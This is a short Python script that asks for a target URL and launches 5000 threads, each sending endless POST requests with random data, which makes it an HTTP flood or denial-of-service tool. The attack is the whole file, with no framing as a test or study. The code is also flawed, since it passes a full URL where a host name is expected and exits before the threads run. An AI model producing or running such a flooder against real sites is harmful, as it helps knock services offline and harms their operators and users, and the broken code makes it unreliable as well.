import http.client
import threading
import random

# Prompt the user for the URL to send requests to
url = input("Enter the URL to send requests to: ")

# Define a function to send POST requests with random data
def send_post_request():
    while True:
        # Generate random data to send with the request
        data = str(random.randint(0, 1000000)).encode('utf-8')
        
        # Send the POST request
        conn = http.client.HTTPConnection(url)
        conn.request("POST", "/", body=data)
        response = conn.getresponse()
        status_code = response.status
        conn.close()

# Create a pool of worker threads to send requests concurrently
num_threads = 5000
for i in range(num_threads):
    t = threading.Thread(target=send_post_request)
    t.daemon = True
    t.start()
